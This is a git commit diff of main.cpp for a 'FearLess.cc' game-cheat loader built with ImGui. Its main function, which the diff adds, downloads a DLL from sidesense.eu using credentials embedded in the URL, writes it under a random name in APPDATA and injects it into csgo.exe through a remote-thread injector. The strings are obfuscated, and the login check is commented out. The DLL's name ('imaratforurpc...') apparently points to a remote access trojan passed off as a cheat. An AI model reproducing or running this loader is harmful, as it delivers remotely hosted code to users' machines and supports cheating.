c707ca43aaaa512d8cfe348230450515ced58fd3
nah#2252 <76122284+poorkid8921@users.noreply.github.com>
2021-05-14 17:50:42 +0300

    Add files via upload

--- main.cpp
+++ main.cpp
@@ -50,7 +50,10 @@
 #pragma comment(lib, "psapi.lib")
 
 static char buf[17] = { 0 };
+static char pass[17] = { 0 };
+static char inv[17] = { 0 };
 static std::string key;
+static std::string passy;
 static bool testCheckbox = false;
 
 static HANDLE GetProcessByName(const wchar_t* name)
@@ -82,6 +85,12 @@ HANDLE StartRoutine(HANDLE hTargetProc, void* pRoutine, void* pArg)
     _NtCTE(&hRet, THREAD_ALL_ACCESS, nullptr, hTargetProc, pRoutine, pArg, 0, 0, 0, 0, nullptr);
     return hRet;
 }
+
+class registerdaboy {
+public:
+    int WINAPI registerg();
+};
+
 
 int Inject(const char* szDllFile, HANDLE hProc)
 {
@@ -124,12 +133,6 @@ int Inject(const char* szDllFile, HANDLE hProc)
     return 0;
 }
 
-bool Authorization() {
-    int auth = 1;
-// nothingm pls do here da login
-    return auth;
-}
-
 static LPDIRECT3D9              g_pD3D = NULL;
 static LPDIRECT3DDEVICE9        g_pd3dDevice = NULL;
 static D3DPRESENT_PARAMETERS    g_d3dpp = {};
@@ -139,158 +142,6 @@ void CleanupDeviceD3D();
 void ResetDevice();
 LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
 
-
-
-int WINAPI WinMain(HINSTANCE, HINSTANCE, PSTR, int)
-{
-    
-    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, _T("FearLess.cc"), NULL };
-    ::RegisterClassEx(&wc);
-    int x = GetSystemMetrics(SM_CXSCREEN) / 2 - LOADERW / 2; // cetner screen x
-    int y = GetSystemMetrics(SM_CYSCREEN) / 2 - LOADERH / 2; // center screen y
-    HWND hwnd = ::CreateWindowExW(WS_EX_LAYERED, wc.lpszClassName, _T("FearLess.cc"), WS_POPUP, x, y, LOADERW, LOADERH, NULL, NULL, wc.hInstance, NULL);
-
-    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);
-
-    if (!CreateDeviceD3D(hwnd))
-    {
-        CleanupDeviceD3D();
-        ::UnregisterClass(wc.lpszClassName, wc.hInstance);
-        return 1;
-    }
-
-    ::ShowWindow(hwnd, SW_SHOWDEFAULT);
-    ::UpdateWindow(hwnd);
-
-    IMGUI_CHECKVERSION();
-    ImGui::CreateContext();
-    ImGuiIO& io = ImGui::GetIO();
-    io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\Tahoma.ttf", 16);
-    
-    ImGui::GetStyle().WindowRounding = 0.0f;
-    ImGui::GetStyle().WindowPadding = ImVec2(0.0f, 0.0f);
-    ImGui::GetStyle().ChildRounding = 0.0f;
-    ImGui::GetStyle().WindowBorderSize = 0.0f;
-    ImGui::GetStyle().WindowTitleAlign = ImVec2(0.5, 0.5);
-    ImGui::GetStyle().PopupBorderSize = 0.0f;
-
-    ImVec4* colors = ImGui::GetStyle().Colors;
-    colors[ImGuiCol_WindowBg] = ImColor(33, 33, 33, 215);//zochem? ia zhe ubral bg?
-    colors[ImGuiCol_ChildBg] = ImColor(21, 20, 21, 255);
-    colors[ImGuiCol_ResizeGrip] = ImColor(42, 40, 43, 0);
-    colors[ImGuiCol_ResizeGripHovered] = ImColor(42, 40, 43, 0);
-    colors[ImGuiCol_ResizeGripActive] = ImColor(42, 40, 43, 0);
-    colors[ImGuiCol_Border] = ImColor(38, 39, 55, 215);
-    colors[ImGuiCol_Button] = ImColor(29, 125, 229, 5);
-    colors[ImGuiCol_ButtonHovered] = ImColor(29, 125, 229, 5);
-    colors[ImGuiCol_ButtonActive] = ImColor(29, 125, 229, 5);
-    colors[ImGuiCol_PopupBg] = ImColor(18, 17, 18, 255);
-
-    ImGui_ImplWin32_Init(hwnd);
-    ImGui_ImplDX9_Init(g_pd3dDevice);
-
-    static bool opened = true;
-
-    MSG msg;
-    ZeroMemory(&msg, sizeof(msg));
-    while (msg.message != WM_QUIT)
-    {
-
-        if (::PeekMessage(&msg, NULL, 0U, 0U, PM_REMOVE))
-        {
-            ::TranslateMessage(&msg);
-            ::DispatchMessage(&msg);
-            continue;
-        }
-
-        ImGui_ImplDX9_NewFrame();
-        ImGui_ImplWin32_NewFrame();
-        ImGui::NewFrame();
-
-        {
-            ImGui::SetNextWindowPos(ImVec2(0, 0));
-            ImGui::SetNextWindowSize(ImVec2(LOADERW, LOADERH));
-            ImGui::Begin(xorstr("FearLess.cc"), &opened, ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoSavedSettings | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoBackground); // Create a window called "Hello, world!" and append into it.
-            
-            ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(), ImVec2(LOADERW, LOADERH), ImColor(50,50,60));
-            ImGui::GetWindowDrawList()->AddRect(ImVec2(), ImVec2(LOADERW, LOADERH), ImColor(188, 188, 188, 50));
-            ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(7, 9), ImVec2(307, 259), ImColor(31, 31, 31));
-         //   ImGui::GetWindowDrawList()->AddRect(ImVec2(7, 9), ImVec2(307, 259), ImColor(188, 188, 188, 50));
-            ImGui::GetWindowDrawList()->AddRectFilledMultiColor(ImVec2(21, 38), ImVec2(294, 43), ImColor(78, 129, 181), ImColor(94, 175, 255), ImColor(64, 159, 255), ImColor( 64, 159, 255));
-          //  ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(21, 54), ImVec2(294, 237), ImColor(22, 22, 22));
-          //  ImGui::GetWindowDrawList()->AddRect(ImVec2(21, 54), ImVec2(294, 237), ImColor(188, 188, 188, 50));
-
-            ImGui::SetCursorPos(ImVec2(307 / 2 - ImGui::CalcTextSize(xorstr("FearLess.cc")).x / 2, 15));
-            ImGui::Text(xorstr("FearLess.cc"));
-            ImGui::SetCursorPos(ImVec2(66, 81));
-            ImGui::Text(xorstr("Invite"));
-            ImGui::PushItemWidth(177);
-            ImGui::SetCursorPos(ImVec2(64, 100));
-            ImGui::InputText(xorstr("###Key"), buf, IM_ARRAYSIZE(buf));
-            ImGui::PopItemWidth();
-            ImGui::SetCursorPos(ImVec2(64, 135));
-            if (ImGui::Button(xorstr("Register"), ImVec2(177, 21))) {
-
-            }
-            ImGui::SetCursorPos(ImVec2(64, 155));
-            if (ImGui::Button(xorstr("Load"), ImVec2(177, 21))) {
-                key = buf;
-                if (Authorization()) {
-                    const char* alphabet = "qwertyuiopasdfghjklzxcvbnm0123456789";
-                    HINTERNET hInternet = InternetOpen(skCrypt(L"тут ваше название"), INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
-                    if (!hInternet) { InternetCloseHandle(hInternet); return 0; }
-                    LPCWSTR query = skCrypt(L"https://google.com/");
-
-                    HINTERNET hUrl = InternetOpenUrl(hInternet, query, 0, 0, 0, 0);
-                    std::string EndFile = getenv(skCrypt("APPDATA"));
-                    EndFile += xorstr("\\");
-                    for (int i = 0; i < 12; i++)
-                    {
-                        EndFile += alphabet[abs(int(rand()) % 36)];
-                    }
-                    EndFile += xorstr(".dll");
-                    DeleteUrlCacheEntry(skCrypt(L"https://HxInbgoiduGIngo:Jfgnbdiwhgonedhg@sidesense.eu/main/imaratforurpcccccc1234io1uJKFDHOIAFANL.dll"));
-                    if (URLDownloadToFileA(0, skCrypt("https://HxInbgoiduGIngo:Jfgnbdiwhgonedhg@sidesense.eu/main/imaratforurpcccccc1234io1uJKFDHOIAFANL.dll"), EndFile.c_str(), 0, 0) != S_OK) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }      // скачиваем dll
-                    HANDLE hProc = GetProcessByName(skCrypt(L"csgo.exe"));
-                    if (!hProc || hProc == 0) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }
-
-                    if (Inject(EndFile.c_str(), hProc)) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }
-                    InternetCloseHandle(hInternet);
-                    InternetCloseHandle(hUrl);
-                    MessageBox(0, L"Cheat Injected!", L"Success", MB_OK);
-                }
-            }
-            ImGui::End();
-        }
-        ImGui::EndFrame();
-        g_pd3dDevice->SetRenderState(D3DRS_ZENABLE, FALSE);
-        g_pd3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, FALSE);
-        g_pd3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, FALSE);
-        g_pd3dDevice->Clear(0, NULL, D3DCLEAR_TARGET | D3DCLEAR_ZBUFFER, NULL, 1.0f, 0);
-        if (g_pd3dDevice->BeginScene() >= 0)
-        {
-            ImGui::Render();
-            ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
-            g_pd3dDevice->EndScene();
-        }
-        HRESULT result = g_pd3dDevice->Present(NULL, NULL, NULL, NULL);
-
-        if (result == D3DERR_DEVICELOST && g_pd3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET)
-            ResetDevice();
-
-        if (!opened) msg.message = WM_QUIT;
-    }
-
-    ImGui_ImplDX9_Shutdown();
-    ImGui_ImplWin32_Shutdown();
-    ImGui::DestroyContext();
-
-    CleanupDeviceD3D();
-    ::DestroyWindow(hwnd);
-    ::UnregisterClass(wc.lpszClassName, wc.hInstance);
-
-    return 0;
-}
 
 bool CreateDeviceD3D(HWND hWnd)
 {
@@ -374,4 +225,160 @@ LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
         return 0;
     }
     return ::DefWindowProc(hWnd, msg, wParam, lParam);
+}
+
+int WINAPI WinMain(HINSTANCE, HINSTANCE, PSTR, int)
+{
+    
+    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, _T("FearLess.cc"), NULL };
+    ::RegisterClassEx(&wc);
+    int x = GetSystemMetrics(SM_CXSCREEN) / 2 - LOADERW / 2; // cetner screen x
+    int y = GetSystemMetrics(SM_CYSCREEN) / 2 - LOADERH / 2; // center screen y
+    HWND hwnd = ::CreateWindowExW(WS_EX_LAYERED, wc.lpszClassName, _T("FearLess.cc"), WS_POPUP, x, y, LOADERW, LOADERH, NULL, NULL, wc.hInstance, NULL);
+
+    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);
+
+    if (!CreateDeviceD3D(hwnd))
+    {
+        CleanupDeviceD3D();
+        ::UnregisterClass(wc.lpszClassName, wc.hInstance);
+        return 1;
+    }
+
+    ::ShowWindow(hwnd, SW_SHOWDEFAULT);
+    ::UpdateWindow(hwnd);
+
+    IMGUI_CHECKVERSION();
+    ImGui::CreateContext();
+    ImGuiIO& io = ImGui::GetIO();
+    io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\Tahoma.ttf", 16);
+    
+    ImGui::GetStyle().WindowRounding = 0.0f;
+    ImGui::GetStyle().WindowPadding = ImVec2(0.0f, 0.0f);
+    ImGui::GetStyle().ChildRounding = 0.0f;
+    ImGui::GetStyle().WindowBorderSize = 0.0f;
+    ImGui::GetStyle().WindowTitleAlign = ImVec2(0.5, 0.5);
+    ImGui::GetStyle().PopupBorderSize = 0.0f;
+
+    ImVec4* colors = ImGui::GetStyle().Colors;
+    colors[ImGuiCol_WindowBg] = ImColor(33, 33, 33, 215);//zochem? ia zhe ubral bg?
+    colors[ImGuiCol_ChildBg] = ImColor(21, 20, 21, 255);
+    colors[ImGuiCol_ResizeGrip] = ImColor(42, 40, 43, 0);
+    colors[ImGuiCol_ResizeGripHovered] = ImColor(42, 40, 43, 0);
+    colors[ImGuiCol_ResizeGripActive] = ImColor(42, 40, 43, 0);
+    colors[ImGuiCol_Border] = ImColor(38, 39, 55, 215);
+    colors[ImGuiCol_Button] = ImColor(29, 125, 229, 5);
+    colors[ImGuiCol_ButtonHovered] = ImColor(29, 125, 229, 5);
+    colors[ImGuiCol_ButtonActive] = ImColor(29, 125, 229, 5);
+    colors[ImGuiCol_PopupBg] = ImColor(18, 17, 18, 255);
+
+    ImGui_ImplWin32_Init(hwnd);
+    ImGui_ImplDX9_Init(g_pd3dDevice);
+
+    static bool opened = true;
+
+    MSG msg;
+    ZeroMemory(&msg, sizeof(msg));
+    while (msg.message != WM_QUIT)
+    {
+
+        if (::PeekMessage(&msg, NULL, 0U, 0U, PM_REMOVE))
+        {
+            ::TranslateMessage(&msg);
+            ::DispatchMessage(&msg);
+            continue;
+        }
+
+        ImGui_ImplDX9_NewFrame();
+        ImGui_ImplWin32_NewFrame();
+        ImGui::NewFrame();
+
+        {
+            ImGui::SetNextWindowPos(ImVec2(0, 0));
+            ImGui::SetNextWindowSize(ImVec2(LOADERW, LOADERH));
+            ImGui::Begin(xorstr("FearLess.cc"), &opened, ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoSavedSettings | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoBackground); // Create a window called "Hello, world!" and append into it.
+            
+            ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(), ImVec2(LOADERW, LOADERH), ImColor(50,50,60));
+            ImGui::GetWindowDrawList()->AddRect(ImVec2(), ImVec2(LOADERW, LOADERH), ImColor(188, 188, 188, 50));
+            ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(7, 9), ImVec2(307, 259), ImColor(31, 31, 31));
+         //   ImGui::GetWindowDrawList()->AddRect(ImVec2(7, 9), ImVec2(307, 259), ImColor(188, 188, 188, 50));
+            ImGui::GetWindowDrawList()->AddRectFilledMultiColor(ImVec2(21, 38), ImVec2(294, 43), ImColor(78, 129, 181), ImColor(94, 175, 255), ImColor(64, 159, 255), ImColor( 64, 159, 255));
+          //  ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(21, 54), ImVec2(294, 237), ImColor(22, 22, 22));
+          //  ImGui::GetWindowDrawList()->AddRect(ImVec2(21, 54), ImVec2(294, 237), ImColor(188, 188, 188, 50));
+
+            ImGui::SetCursorPos(ImVec2(307 / 2 - ImGui::CalcTextSize(xorstr("FearLess.cc")).x / 2, 15));
+            ImGui::Text(xorstr("FearLess.cc"));
+            ImGui::SetCursorPos(ImVec2(66, 81));
+            ImGui::Text(xorstr("UserName"));
+            ImGui::PushItemWidth(177);
+            ImGui::SetCursorPos(ImVec2(64, 100));
+            ImGui::InputText(xorstr("###Key"), buf, IM_ARRAYSIZE(buf));
+            ImGui::PopItemWidth();
+
+            ImGui::SetCursorPos(ImVec2(66, 120));
+            ImGui::Text(xorstr("Password"));
+            ImGui::PushItemWidth(177);
+            ImGui::SetCursorPos(ImVec2(64, 140));
+            ImGui::InputText(xorstr("###Pass"), pass, IM_ARRAYSIZE(pass));
+            ImGui::PopItemWidth();
+
+            ImGui::SetCursorPos(ImVec2(64, 165));
+            if (ImGui::Button(xorstr("Load"), ImVec2(177, 21))) {
+                key = buf;
+                passy = pass;
+             //   if (Authorization()) {
+                    const char* alphabet = "qwertyuiopasdfghjklzxcvbnm0123456789";
+                    HINTERNET hInternet = InternetOpen(skCrypt(L"тут ваше название"), INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
+                    if (!hInternet) { InternetCloseHandle(hInternet); return 0; }
+                    LPCWSTR query = skCrypt(L"https://sidesense.eu/");
+
+                    HINTERNET hUrl = InternetOpenUrl(hInternet, query, 0, 0, 0, 0);
+                    std::string EndFile = getenv(skCrypt("APPDATA"));
+                    EndFile += xorstr("\\");
+                    for (int i = 0; i < 12; i++)
+                    {
+                        EndFile += alphabet[abs(int(rand()) % 36)];
+                    }
+                    EndFile += xorstr(".dll");
+                    DeleteUrlCacheEntry(skCrypt(L"https://HxInbgoiduGIngo:Jfgnbdiwhgonedhg@sidesense.eu/main/imaratforurpcccccc1234io1uJKFDHOIAFANL.dll"));
+                    if (URLDownloadToFileA(0, skCrypt("https://HxInbgoiduGIngo:Jfgnbdiwhgonedhg@sidesense.eu/main/imaratforurpcccccc1234io1uJKFDHOIAFANL.dll"), EndFile.c_str(), 0, 0) != S_OK) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }      // скачиваем dll
+                    HANDLE hProc = GetProcessByName(skCrypt(L"csgo.exe"));
+                    if (!hProc || hProc == 0) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }
+
+                    if (Inject(EndFile.c_str(), hProc)) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }
+                    InternetCloseHandle(hInternet);
+                    InternetCloseHandle(hUrl);
+                    MessageBox(0, L"Cheat Injected!", L"Success", MB_OK);
+      //          }
+            }
+            ImGui::End();
+        }
+        ImGui::EndFrame();
+        g_pd3dDevice->SetRenderState(D3DRS_ZENABLE, FALSE);
+        g_pd3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, FALSE);
+        g_pd3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, FALSE);
+        g_pd3dDevice->Clear(0, NULL, D3DCLEAR_TARGET | D3DCLEAR_ZBUFFER, NULL, 1.0f, 0);
+        if (g_pd3dDevice->BeginScene() >= 0)
+        {
+            ImGui::Render();
+            ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
+            g_pd3dDevice->EndScene();
+        }
+        HRESULT result = g_pd3dDevice->Present(NULL, NULL, NULL, NULL);
+
+        if (result == D3DERR_DEVICELOST && g_pd3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET)
+            ResetDevice();
+
+        if (!opened) msg.message = WM_QUIT;
+    }
+
+    ImGui_ImplDX9_Shutdown();
+    ImGui_ImplWin32_Shutdown();
+    ImGui::DestroyContext();
+
+    CleanupDeviceD3D();
+    ::DestroyWindow(hwnd);
+    ::UnregisterClass(wc.lpszClassName, wc.hInstance);
+
+    return 0;
 }
